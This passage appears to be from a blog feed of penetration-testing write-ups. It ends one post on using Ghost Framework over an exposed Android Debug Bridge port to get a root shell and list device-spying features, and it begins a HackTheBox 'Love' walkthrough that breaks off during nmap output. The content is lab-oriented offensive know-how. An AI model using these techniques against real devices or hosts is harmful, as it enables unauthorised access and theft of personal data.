&lt;p&gt;Searching around the Internet, i came across a very intersting tool, called &lt;strong&gt;Ghost Framework&lt;/strong&gt;, an &amp;ldquo;Android post-exploitation framework that exploits the Android Debug Bridge to remotely access an Android device&amp;rdquo;. First we need to dowload it with:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip3 install git+https://github.com/EntySec/Ghost
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The we can run it with:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ghost
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This will open the Ghost Framework, where we can enter &lt;code&gt;help&lt;/code&gt; to see our available options:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/9.png&#34; alt=&#34;Pasted image 20210705053951.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;All we need to do is connect to the device. We have already port forwarded our traffic from our local port 6666 to the port 5555 of the target, so we are going to connect to &lt;strong&gt;localhost:6666&lt;/strong&gt; with:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;connect localhost:6666
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We can then also type &lt;code&gt;help&lt;/code&gt; to see our options:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/10.png&#34; alt=&#34;Pasted image 20210705054135.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;To get root all we need to do is type &lt;code&gt;shell&lt;/code&gt; to get into a shell on the device as the user &lt;strong&gt;shell&lt;/strong&gt; and then &lt;code&gt;su root&lt;/code&gt; to get root, the same way we did before.&lt;/p&gt;
&lt;p&gt;While getting root on this particular device with Ghost Framwork is not needed, it can do many more things, that may be very useful in a real life scenario. With Ghost Framework we can:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Show device activity information.&lt;/li&gt;
&lt;li&gt;Show device battery state.&lt;/li&gt;
&lt;li&gt;Show device network information.&lt;/li&gt;
&lt;li&gt;Show device system information.&lt;/li&gt;
&lt;li&gt;Control device wifi service.&lt;/li&gt;
&lt;li&gt;Click the specified x and y axis. (For example click the show password while a user is on a login screen and then take a screenshot of the password)&lt;/li&gt;
&lt;li&gt;Control device keyboard.&lt;/li&gt;
&lt;li&gt;Press/Simulate keypress on target device.&lt;/li&gt;
&lt;li&gt;Open a URL on the device.&lt;/li&gt;
&lt;li&gt;Control device screen.&lt;/li&gt;
&lt;li&gt;Take a screenshot from the device.&lt;/li&gt;
&lt;li&gt;Open a shell on the target device.&lt;/li&gt;
&lt;li&gt;Type a specified text on the device.&lt;/li&gt;
&lt;li&gt;Upload a local file from our machine to the target device.&lt;/li&gt;
&lt;li&gt;Download files from the target device.&lt;/li&gt;
&lt;li&gt;Show the Contacts that are saved on the device.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All in all, Ghost Framework seems to be another simple yet powerful tool to use for Android Post-Exploitation.&lt;/p&gt;
&lt;h1 id=&#34;useful-resources&#34;&gt;Useful Resources:&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Learn about adb&lt;/strong&gt;: &lt;a href=&#34;https://developer.android.com/studio/command-line/adb&#34;&gt;https://developer.android.com/studio/command-line/adb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Learn about shell user permissions&lt;/strong&gt;: &lt;a href=&#34;https://doridori.github.io/Android-Security-welcome-to-shell/#sthash.Btvzl8T0.dpbs&#34;&gt;https://doridori.github.io/Android-Security-welcome-to-shell/#sthash.Btvzl8T0.dpbs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ghost Framework Github Page&lt;/strong&gt;: &lt;a href=&#34;https://github.com/EntySec/Ghost&#34;&gt;https://github.com/EntySec/Ghost&lt;/a&gt;&lt;/p&gt;
</content>
            
            
            
                
                
                
                    
                    
                    
                        
                            <category scheme="https://netuserdoomdesire.github.io/posts/writeups/" term="posts\Writeups\" label="posts\Writeups\" />
                        
                    
                
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Love Writeup (HackTheBox)</title>
            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/love/" />
            <id>https://netuserdoomdesire.github.io/posts/writeups/love/</id>
            <updated>2021-08-07T22:20:37&#43;03:00</updated>
            <published>2021-08-07T10:00:00&#43;03:00</published>
            <author>
                    <name>Doomdesire</name>
                    <uri>https://netuserdoomdesire.github.io/</uri>
                    </author>
            <summary type="html">Overview Machine: https://www.hackthebox.eu/home/machines/profile/344 Love is an easy HackTheBox Windows machine created by pwnmeow (https://www.hackthebox.eu/home/users/profile/157669). We begin by exploiting an SSRF vulnerability on a web page found from the certificate information leak, letting us view a webpage, accessible only from localhost. From there we exploit the AlwaysInstallElevated Windows feature in order to install a malicious .</summary>
            
                <content type="html">&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/1.png&#34; alt=&#34;Pasted image 20210803061156.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/344&#34;&gt;https://www.hackthebox.eu/home/machines/profile/344&lt;/a&gt;
Love is an easy HackTheBox Windows machine created by &lt;strong&gt;pwnmeow&lt;/strong&gt; (&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/157669)&#34;&gt;https://www.hackthebox.eu/home/users/profile/157669)&lt;/a&gt;. We begin by exploiting an SSRF vulnerability on a web page found from the certificate information leak, letting us view a webpage, accessible only from localhost. From there we exploit the AlwaysInstallElevated Windows feature in order to install a malicious .msi package, that will grant us System privileges.&lt;/p&gt;
&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
&lt;p&gt;We can start with the standard nmap, scanning all ports:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sC -sV -p- 10.10.10.239 -oA Love
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-08-03 06:09 EDT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.239
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.080s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;65516&lt;/span&gt; closed ports
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT      STATE SERVICE      VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp    open  http         Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-cookie-flags: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   /: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     PHPSESSID: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      httponly flag not &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Voting System using PHP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;135/tcp   open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;443/tcp   open  ssl/http     Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;staging.love.htb/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ValentineCorp/stateOrProvinceName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;m/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-01-18T14:00:16
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-01-18T14:00:16
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;445/tcp   open  microsoft-ds Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Pro &lt;span class=&#34;m&#34;&gt;19042&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3306/tcp  open  mysql?
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5000/tcp  open  http         Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5040/tcp  open  unknown
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOVE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: DNS:LOVE, DNS:Love
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-11T14:39:19
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2024-04-10T14:39:19
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-08-03T10:44:06+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +29m16s from scanner time.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;7680/tcp  open  pando-pub?
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49664/tcp open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49665/tcp open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49666/tcp open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49667/tcp open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49668/tcp open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49669/tcp open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;49670/tcp open  msrpc        Microsoft Windows RPC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: Hosts: www.example.com, LOVE, www.love.htb&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host script results:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 2h14m16s, deviation: 3h30m01s, median: 29m15s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Pro &lt;span class=&#34;m&#34;&gt;19042&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Pro 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS CPE: cpe:/o:microsoft:windows_10::-
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: Love
